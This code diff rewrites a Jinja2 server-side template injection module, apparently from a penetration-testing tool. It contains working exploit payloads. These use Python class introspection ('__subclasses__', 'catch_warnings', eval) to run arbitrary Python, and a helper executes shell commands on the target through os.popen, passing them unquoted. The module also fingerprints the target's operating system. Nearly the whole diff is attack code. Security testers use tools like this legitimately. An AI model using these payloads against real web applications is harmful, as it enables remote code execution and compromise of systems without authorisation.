@@ -3,84 +3,53 @@ from utils.loggers import log
 from utils import rand
 import string
 
-class Jinja2(Check):
-    
-    def detect(self):
-        
-        # Set base tag
-        self.base_tag = '{{%s}}'
-        
-        # Skip reflection check if same tag has been detected before
-        if self.get('reflect_tag') != self.base_tag:
-            self._check_reflection()
-            
-            # Return if reflect_tag is not set
-            if not self.get('reflect_tag'):
-                return
-                
-            log.warn('Reflection detected with tag \'%s\'' % self.get('reflect_tag'))
-        
-        self._check_python()
-            
-        if not self.get('language') or  not self.get('engine'):
-            return
-            
-        log.warn('Python injection detected')   
-        
-        self._check_os()
-        
-        if not self.get('exec'):
-            return
-            
-        log.warn(
-            'Shell command execution detected on \'%s\' operating system' % (
-                self.get('os', 'undetected')
-            )
-        )
 
-    def _check_python(self):
-        
+class Jinja2(Check):
+
+    render_tag = '{{%(payload)s}}'
+    header_tag = '{{%(header)s}}'
+    trailer_tag = '{{%(trailer)s}}'
+    contexts = [
+        { 'level': 1, 'prefix': '""}}', 'suffix' : '{{""' },
+    ]
+
+    def detect_engine(self):
+
         randA = rand.randstr_n(2)
         randB = rand.randstr_n(2)
-        
+
         payload = '{{"%s".join("%s")}}' % (randA, randB)
         expected = randA.join(randB)
-        
-        if expected == self.req(payload):
+
+        if expected == self.inject(payload):
             self.set('language', 'python')
             self.set('engine', 'jinja2')
-    
-    def _check_reflection(self):
-        
-        randA = rand.randint_n(1)
-        randB = rand.randint_n(1)
+            self.set('eval', 'python')
 
-        payload = '{{%i*%i}}' % (randA, randB)
-        expected = str(randA*randB)
-        
-        if expected == self.req(payload):
-            self.set('reflect_tag', self.base_tag)
-        
-    def _check_os(self):
-        
-        expected_rand = str(rand.randint_n(1))
-        
-        payload = """{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
+    def detect_eval(self):
+
+        payload = """"-".join([__import__("os").name, __import__("sys").platform])"""
+        self.set('os', self.evaluate(payload))
+        self.set('eval', 'python')
+
+    def evaluate(self, code):
+        return self.inject("""{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
 {%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
 {%% if 'eval' in b.keys() %%}
-{{ b['eval']('__import__("os").popen("echo %s").read()') }}
+{{ b['eval']('%s') }}
 {%% endif %%} {%% endif %%} {%% endfor %%}
-{%% endif %%} {%% endfor %%}""" % expected_rand
-                
-                
-        if expected_rand == self.req(payload):
-            self.set('exec', True)      
+{%% endif %%} {%% endfor %%}"""  % (code))
 
-        payload = """{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %}
-{% for b in c.__init__.func_globals.values() %} {% if b.__class__ == {}.__class__ %}
-{% if 'eval' in b.keys() %}
-{{ b['eval']('__import__("os").name') }}-{{ b['eval']('__import__("sys").platform') }}
-{% endif %} {% endif %} {% endfor %}
-{% endif %} {% endfor %}"""
-                
-        self.set('os', self.req(payload))
+    def detect_exec(self):
+
+        expected_rand = str(rand.randint_n(2))
+
+        if expected_rand == self.execute('echo %s' % expected_rand):
+            self.set('exec', True)
+
+    def execute(self, command):
+
+        execution_code = '__import__("os").popen("%s").read()' % command
+
+        # TODO: quote command
+        return self.evaluate(execution_code)
